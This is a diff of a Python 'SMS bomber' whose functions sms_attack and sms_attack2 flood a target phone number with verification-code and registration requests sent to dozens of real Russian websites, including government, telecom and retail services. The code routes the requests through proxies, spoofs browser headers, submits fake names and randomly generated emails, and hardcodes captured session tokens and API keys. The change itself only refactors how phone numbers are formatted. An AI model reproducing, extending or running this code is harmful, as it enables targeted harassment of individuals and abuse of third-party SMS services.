-            num2 = ""
-            num2 += "+"
-            num2 += '7'
-            num2 += ' '
-            num2 += num[1]
-            num2 += num[2]
-            num2 += num[3]
-            num2 += ' '
-            num2 += num[4]
-            num2 += num[5]
-            num2 += num[6]
-            num2 += '-'
-            num2 += num[7]
-            num2 += num[8]
-            num2 += '-'
-            num2 += num[9]
-            num2 += num[10]
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -2109,7 +2040,7 @@ def sms_attack(number, time_a):
                 'x-kl-ajax-request': 'Ajax_Request'
             }
 
-            payload = {"phone_formated": num2, "auth": "6d122a698ceb27bd5be268f4", "type": "start",
+            payload = {"phone_formated": num11, "auth": "6d122a698ceb27bd5be268f4", "type": "start",
                        "code": ""}
 
             requests.post('https://firstvds.ru/my/number_check', json=payload, headers=header)
@@ -2134,8 +2065,6 @@ def sms_attack2(number, time_a):
         }
 
         try:
-            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}"
-
             header = {
                 'Accept': 'application/json, text/javascript, */*; q=0.01',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -2155,13 +2084,11 @@ def sms_attack2(number, time_a):
                 'X-Requested-With': 'XMLHttpRequest'
             }
 
-            requests.get(f'https://www.winelab.ru/login/send/confirmationcode?number={num2}&_=1667424921408',
+            requests.get(f'https://www.winelab.ru/login/send/confirmationcode?number={num1}&_=1667424921408',
                          headers=header, proxies=proxy_2)
         except:
             pass
         try:
-            num2 = f"7 {number[1:4]}-{number[4:7]}-{number[7:9]}-{number[9:]}"
-
             header = {
                 'accept': 'application/json',
                 'accept-encoding': 'gzip, deflate, br',
@@ -2186,7 +2113,7 @@ def sms_attack2(number, time_a):
 
             payload = {
                 "query": "#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}",
-                "variables": {"type": "phone", "initialState": {"phoneNumber": num2, "defaultOrderCityId": "spb-prfr",
+                "variables": {"type": "phone", "initialState": {"phoneNumber": num269, "defaultOrderCityId": "spb-prfr",
                                                                 "currentHost": "https://spb.profi.ru"}}}
 
             requests.post('https://spb.profi.ru/graphql', json=payload, headers=header, proxies=proxy_2)
@@ -2388,8 +2315,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = f"+7 ({number[1:4]}) {number[4:7]} - {number[7:9]} - {number[9:]}"
-
             header = {
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'accept-encoding': 'gzip, deflate, br',
@@ -2412,7 +2337,7 @@ def sms_attack2(number, time_a):
             payload = {
                 'wct_reg_fio': 'Кондратьев',
                 'wct_reg_fio2': 'Василий',
-                'wct_reg_phone': num2,
+                'wct_reg_phone': num3,
                 'wct_reg_ch': 'Y',
                 'wct_reg_1': '',
                 'wct_reg_2': '',
@@ -2429,8 +2354,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'Accept': 'application/json, text/plain, */*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -2459,15 +2382,13 @@ def sms_attack2(number, time_a):
                            "owox_session_id": "2803055798.1667505193_1667505197845", "city_confirmed": "true",
                            "selected_target": "p2",
                            "_efst": "945447c2f000a249a96b6e6b10f462844f3b06628854b34613dea1c11eb93041"}},
-                       "client": {"phone": num2, "recaptchaToken": None, "cityId": 2}, "brandId_H": "lY"}
+                       "client": {"phone": num4, "recaptchaToken": None, "cityId": 2}, "brandId_H": "lY"}
 
             requests.post('https://admin.growfood.pro/api/personal-cabinet/v1/authentication/send-sms', json=payload,
                           headers=header, proxies=proxy_2)
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': 'application/json',
                 'accept-encoding': 'gzip, deflate, br',
@@ -2509,7 +2430,7 @@ def sms_attack2(number, time_a):
             }
 
             payload = {
-                "phoneNumber": num2,
+                "phoneNumber": num4,
                 "captcha": ""
             }
 
@@ -2519,8 +2440,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -2542,7 +2461,7 @@ def sms_attack2(number, time_a):
             }
 
             payload = {
-                'userPhone': num2,
+                'userPhone': num4,
                 'captchaCode': '',
                 'captchaWord': '',
                 'sessid': '79eb9fa06a250d301c9cdc119acc4a2e'
@@ -2554,8 +2473,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5} {6}{7}{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -2575,7 +2492,7 @@ def sms_attack2(number, time_a):
             }
 
             payload = {
-                'phoneNumber': num2,
+                'phoneNumber': num5,
                 'lang': 'ru',
                 'APIKey': '4_eXEZkSmgY277qYb5XXqALQ',
                 'source': 'showScreenSet',
@@ -2591,8 +2508,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = f"7 {number[1:4]}-{number[4:7]}-{number[7:9]}-{number[9:]}"
-
             header = {
                 'accept': 'application/json',
                 'accept-encoding': 'gzip, deflate, br',
@@ -2617,7 +2532,7 @@ def sms_attack2(number, time_a):
 
             payload = {
                 "query": "#prfrtkn:front:674c8b3850056b43f431415d44590346396ce839:30d6b358b6ad046bcc5c510e2159ee8fcfb2c5b9\nquery authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) {\n  authStrategyStart(type: $type, initialState: $initialState) {\n    ...AuthStrategyUseResultFragment\n  }\n}\n    fragment AuthStrategyUseResultFragment on AuthStrategyUseResult {\n  strategy {\n    strategyDescriptor\n    stepDescriptor\n    name\n    type\n  }\n  result {\n    __typename\n    ... on AuthStrategyResultRetry {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultError {\n      answer {\n        __typename\n        errors {\n          __typename\n          code\n          message\n          param\n        }\n      }\n    }\n    ... on AuthStrategyResultSuccess {\n      __typename\n      answer {\n        __typename\n        events {\n          __typename\n          ... on AuthStrategyIAnalyticEvent {\n            type\n          }\n        }\n      }\n      auth {\n        loginUrl\n      }\n      step {\n        __typename\n        stepId\n        title\n        ... on AuthStrategyStepFillPhone {\n          phoneSuggestion\n        }\n        ... on AuthStrategyStepValidateMobileId {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepValidatePincode {\n          phoneNumber\n          resendDelay\n        }\n        ... on AuthStrategyStepFillUserInfo {\n          requestedFields {\n            __typename\n            fieldId\n            type\n            required\n            suggestedValue\n          }\n        }\n        ... on AuthStrategyStepRequestSocNet {\n          socNetId\n          oAuthStateToken\n          popupUrl\n          windowWidth\n          windowHeight\n        }\n        ... on AuthStrategyStepRequestYandex {\n          appId\n          scopes\n        }\n      }\n    }\n  }\n}",
-                "variables": {"type": "phone", "initialState": {"phoneNumber": num2, "defaultOrderCityId": "spb-prfr",
+                "variables": {"type": "phone", "initialState": {"phoneNumber": num269, "defaultOrderCityId": "spb-prfr",
                                                                 "currentHost": "https://spb.profi.ru"}}}
 
             requests.post('https://profi.ru/graphql', json=payload, headers=header, proxies=proxy_2)
@@ -2649,8 +2564,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = '+7 ({0}) {1}-{2}-{3}'.format(number[1:4], number[4:7], number[7:9], number[9:11])
-
             header = {
                 'accept': 'application/json',
                 'accept-encoding': 'gzip, deflate, br',
@@ -2674,7 +2587,7 @@ def sms_attack2(number, time_a):
                 "confirm": "on",
                 "email": "hrufmdo_23@hotmail.com",
                 "password": "Hoho_HO123",
-                'phone': num2
+                'phone': num6
             }
 
             requests.post('https://wallet.1cupis.ru/doSendSms', json=payload, headers=header, proxies=proxy_2)
@@ -2706,8 +2619,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = f"+7 ({number[1:4]}) {number[4:7]}-{number[7:]}"
-
             header = {
                 'Accept': 'application/json, text/plain, */*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -2758,7 +2669,7 @@ def sms_attack2(number, time_a):
                 "name": "Вася",
                 "password": "Hoho_HO123",
                 "password_repeat": "Hoho_HO123",
-                "phone": num2,
+                "phone": num7,
                 "sex": "male",
                 "token": token
             }
@@ -2903,8 +2814,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -2925,7 +2834,7 @@ def sms_attack2(number, time_a):
             }
 
             payload = {
-                'userPhone': num2,
+                'userPhone': num4,
                 'checkWord': '2QI6HY}h%YHc9Mxa6QOmC8htR5',
                 'repeat': '0',
                 'SITE_ID': 's1',
@@ -3041,19 +2950,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7({}{}{}){}{}{}{}".format(number[1], number[2], number[3], number[4], number[5], number[6], number[7]+number[8]+number[9]+number[10])
-
-            lib = '1234567890qwertyuiopasdfghjklzxcvbnm'
-            lib2 = [
-                '@gmail.com',
-                '@hotmail.com',
-                '@yahoo.com',
-                '@yandex.ru'
-            ]
-            email = ''
-            for i in range(random.randint(8, 27)):
-                email += random.choice(lib)
-            email += random.choice(lib2)
 
             header = {
                 'Accept': 'application/json, text/plain, */*',
@@ -3082,7 +2978,7 @@ def sms_attack2(number, time_a):
                 'email': email,
                 'first_name': 'Потанин',
                 'last_name': 'Василий',
-                'phone': num2
+                'phone': num8
             }
 
             requests.post('https://esia.gosuslugi.ru/registration_api/user-data', json=payload, headers=header,
@@ -3090,17 +2986,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            lib = '1234567890qwertyuiopasdfghjklzxcvbnm'
-            lib2 = [
-                '@gmail.com',
-                '@hotmail.com',
-                '@yahoo.com',
-                '@yandex.ru'
-            ]
-            email = ''
-            for i in range(random.randint(8, 27)):
-                email += random.choice(lib)
-            email += random.choice(lib2)
 
             header = {
                 'accept': 'application/json, text/plain, */*',
@@ -3129,12 +3014,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num = number
-            num2 = num[1] + num[2] + num[3]
-            num3 = num[4] + num[5] + num[6]
-            num4 = num[7] + num[8]
-            num5 = num[9] + num[10]
-
             header = {
                 'Accept': 'application/json, text/javascript, */*; q=0.01',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -3154,12 +3033,11 @@ def sms_attack2(number, time_a):
             }
 
             requests.get(
-                f'https://www.yota.ru/voice/order-sim?p_p_id=yotagoodsorder_WAR_ecommerceportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_cacheability=cacheLevelPage&p_p_col_id=column-1&p_p_col_count=2&_yotagoodsorder_WAR_ecommerceportlet_cmd=SaveOrderAndSendOtpCommand&_yotagoodsorder_WAR_ecommerceportlet_goodId=10&_yotagoodsorder_WAR_ecommerceportlet_timezone=1&_yotagoodsorder_WAR_ecommerceportlet_orderId=1658701&_yotagoodsorder_WAR_ecommerceportlet_fiasCode=a376e68d724a4472be7c891bdb09ae32&_yotagoodsorder_WAR_ecommerceportlet_phone=%2B7%20{num2}%20{num3}%20{num4}%20{num5}&_yotagoodsorder_WAR_ecommerceportlet_receivingWay=DELIVERY&_yotagoodsorder_WAR_ecommerceportlet_quantity=1&_yotagoodsorder_WAR_ecommerceportlet_isSet=true&_yotagoodsorder_WAR_ecommerceportlet_b2b=false&_yotagoodsorder_WAR_ecommerceportlet_createSource=site&_yotagoodsorder_WAR_ecommerceportlet_totalCoast=400&_yotagoodsorder_WAR_ecommerceportlet_sr=false&_yotagoodsorder_WAR_ecommerceportlet_mnp=true&_yotagoodsorder_WAR_ecommerceportlet_customerComment=&_yotagoodsorder_WAR_ecommerceportlet_paymentType=CASH&_yotagoodsorder_WAR_ecommerceportlet_deliverFrom=2022-11-06%2009%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliverTo=2022-11-06%2012%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliveryCost=0&_yotagoodsorder_WAR_ecommerceportlet_address=%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_fullAddress=454087%2C%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%2C%20%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_latitude=55.128053&_yotagoodsorder_WAR_ecommerceportlet_longitude=61.381264&_yotagoodsorder_WAR_ecommerceportlet_city=%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA&_yotagoodsorder_WAR_ecommerceportlet_street=%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F&_yotagoodsorder_WAR_ecommerceportlet_house=2&_yotagoodsorder_WAR_ecommerceportlet_block=&_yotagoodsorder_WAR_ecommerceportlet_flat=&_yotagoodsorder_WAR_ecommerceportlet_fiasId=34bef4c8-de57-4d87-b8ed-912100b15903&_yotagoodsorder_WAR_ecommerceportlet_entrance=&_=1667594885833',
+                f'https://www.yota.ru/voice/order-sim?p_p_id=yotagoodsorder_WAR_ecommerceportlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_cacheability=cacheLevelPage&p_p_col_id=column-1&p_p_col_count=2&_yotagoodsorder_WAR_ecommerceportlet_cmd=SaveOrderAndSendOtpCommand&_yotagoodsorder_WAR_ecommerceportlet_goodId=10&_yotagoodsorder_WAR_ecommerceportlet_timezone=1&_yotagoodsorder_WAR_ecommerceportlet_orderId=1658701&_yotagoodsorder_WAR_ecommerceportlet_fiasCode=a376e68d724a4472be7c891bdb09ae32&_yotagoodsorder_WAR_ecommerceportlet_phone=%2B7%20{num21}%20{num22}%20{num23}%20{num24}&_yotagoodsorder_WAR_ecommerceportlet_receivingWay=DELIVERY&_yotagoodsorder_WAR_ecommerceportlet_quantity=1&_yotagoodsorder_WAR_ecommerceportlet_isSet=true&_yotagoodsorder_WAR_ecommerceportlet_b2b=false&_yotagoodsorder_WAR_ecommerceportlet_createSource=site&_yotagoodsorder_WAR_ecommerceportlet_totalCoast=400&_yotagoodsorder_WAR_ecommerceportlet_sr=false&_yotagoodsorder_WAR_ecommerceportlet_mnp=true&_yotagoodsorder_WAR_ecommerceportlet_customerComment=&_yotagoodsorder_WAR_ecommerceportlet_paymentType=CASH&_yotagoodsorder_WAR_ecommerceportlet_deliverFrom=2022-11-06%2009%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliverTo=2022-11-06%2012%3A00&_yotagoodsorder_WAR_ecommerceportlet_deliveryCost=0&_yotagoodsorder_WAR_ecommerceportlet_address=%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_fullAddress=454087%2C%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%D0%B0%D1%8F%20%D0%BE%D0%B1%D0%BB%2C%20%D0%B3%20%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA%2C%20%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F%2C%20%D0%B4%202&_yotagoodsorder_WAR_ecommerceportlet_latitude=55.128053&_yotagoodsorder_WAR_ecommerceportlet_longitude=61.381264&_yotagoodsorder_WAR_ecommerceportlet_city=%D0%A7%D0%B5%D0%BB%D1%8F%D0%B1%D0%B8%D0%BD%D1%81%D0%BA&_yotagoodsorder_WAR_ecommerceportlet_street=%D1%83%D0%BB%20%D0%9C%D0%BE%D1%81%D0%BA%D0%BE%D0%B2%D1%81%D0%BA%D0%B0%D1%8F&_yotagoodsorder_WAR_ecommerceportlet_house=2&_yotagoodsorder_WAR_ecommerceportlet_block=&_yotagoodsorder_WAR_ecommerceportlet_flat=&_yotagoodsorder_WAR_ecommerceportlet_fiasId=34bef4c8-de57-4d87-b8ed-912100b15903&_yotagoodsorder_WAR_ecommerceportlet_entrance=&_=1667594885833',
                 headers=header, proxies=proxy_2)
         except:
             pass
         try:
-            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:9]}-{number[9:]}"
 
             header = {
                 'accept': 'application/json, text/plain, */*',
@@ -3178,15 +3056,13 @@ def sms_attack2(number, time_a):
                 'User-Agent': user
             }
 
-            payload = {'dest': num2}
+            payload = {'dest': num1}
 
             requests.post('https://admin.foodzo.ru/api/v2/users/send-code/phone', json=payload, headers=header,
                           proxies=proxy_2)
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -3210,7 +3086,7 @@ def sms_attack2(number, time_a):
                 'AUTH_FORM': 'Y',
                 'TYPE': 'AUTH',
                 'FORM[AUTH_TYPE]': 'PHONE',
-                'FORM[PHONE]': num2
+                'FORM[PHONE]': num4
             }
 
             requests.post('https://online.globus.ru/', data=payload, headers=header, proxies=proxy_2)
@@ -3314,8 +3190,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 {} {} {} {} {}{}".format(num[1:4], num[4:7], num[7:9], num[9:11])
-
             header = {
                 'accept': 'application/json, text/plain, */*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -3336,7 +3210,7 @@ def sms_attack2(number, time_a):
             }
 
             payload = {
-                'phone': num2,
+                'phone': num9,
                 "g-recaptcha-response": {}
             }
 
@@ -3372,8 +3246,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -3395,7 +3267,7 @@ def sms_attack2(number, time_a):
             }
 
             payload = {
-                'userPhone': num2,
+                'userPhone': num4,
                 'captchaCode': '',
                 'captchaWord': '',
                 'sessid': 'e13afe9718f81a6518cbaa0bda8979e3'
@@ -3598,8 +3470,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -3623,7 +3493,7 @@ def sms_attack2(number, time_a):
             }
 
             payload = {
-                'phone': num2
+                'phone': num4
             }
 
             requests.post('https://oauth.av.ru/check-phone', json=payload, headers=header)
@@ -3744,8 +3614,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'Accept': 'application/json, text/plain, */*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -3769,7 +3637,7 @@ def sms_attack2(number, time_a):
             }
 
             payload = {
-                'phone': num2,
+                'phone': num4,
                 'u': "U"
             }
 
@@ -3831,14 +3699,12 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = f"+7({number[1:4]}){number[4:7]}-{number[7:]}"
-
             header = {
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'accept-language': 'fr-FR,fr',
                 'content-length': '38',
                 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-                'cookie': f'PHPSESSID=YWIt431vw9nAZFsQkfDmZmk2XxczAqwN; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A44%2C%22EXPIRE%22%3A1668113940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BXMT_PHONE=%2B{num2}',
+                'cookie': f'PHPSESSID=YWIt431vw9nAZFsQkfDmZmk2XxczAqwN; BITRIX_CONVERSION_CONTEXT_s1=%7B%22ID%22%3A44%2C%22EXPIRE%22%3A1668113940%2C%22UNIQUE%22%3A%5B%22conversion_visit_day%22%5D%7D; BXMT_PHONE=%2B{num10}',
                 'origin': 'https://airsoft-rus.ru',
                 'referer': 'https://airsoft-rus.ru/',
                 'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
@@ -3852,7 +3718,7 @@ def sms_attack2(number, time_a):
             }
 
             payload = {
-                'phone': '+' + num2,
+                'phone': '+' + num10,
                 'register': True
             }
 
@@ -3891,8 +3757,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'accept': 'application/json, text/javascript, */*; q=0.01',
                 'accept-encoding': 'gzip, deflate, br',
@@ -3915,7 +3779,7 @@ def sms_attack2(number, time_a):
             payload = {
                 'FUSER_ID': '235877642',
                 'USER_NAME': '',
-                'USER_PHONE': num2,
+                'USER_PHONE': num4,
                 'token': '',
                 'is_retry': ''
             }
@@ -3978,8 +3842,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'Accept': '*/*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -4003,7 +3865,7 @@ def sms_attack2(number, time_a):
 
             payload = {
                 'action': 'code_sms',
-                'PERSONAL_PHONE': num2,
+                'PERSONAL_PHONE': num4,
                 'PERSONAL_EMAIL': ''
             }
 
@@ -4067,8 +3929,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)
-
             header = {
                 'Accept': '*/*',
                 'Accept-Encoding': 'gzip, deflate, br',
@@ -4093,7 +3953,7 @@ def sms_attack2(number, time_a):
             payload = {
                 'step': '1',
                 'pets': '',
-                'phone': num2,
+                'phone': num4,
                 'token': '',
                 'lastName': '',
                 'firstName': '',
@@ -4230,8 +4090,6 @@ def sms_attack2(number, time_a):
         except:
             pass
         try:
-            num2 = f"+7 ({number[1:4]}) {number[4:7]}-{number[7:]}"
-
             header = {
                 'accept': '*/*',
                 'accept-encoding': 'gzip, deflate, br',
@@ -4251,7 +4109,7 @@ def sms_attack2(number, time_a):
                 'x-kl-ajax-request': 'Ajax_Request'
             }
 
-            payload = {"phone_formated": num2, "auth": "6d122a698ceb27bd5be268f4", "type": "start",
+            payload = {"phone_formated": num7, "auth": "6d122a698ceb27bd5be268f4", "type": "start",
                        "code": ""}
 
             requests.post('https://firstvds.ru/my/number_check', json=payload, headers=header, proxies=proxy_2)
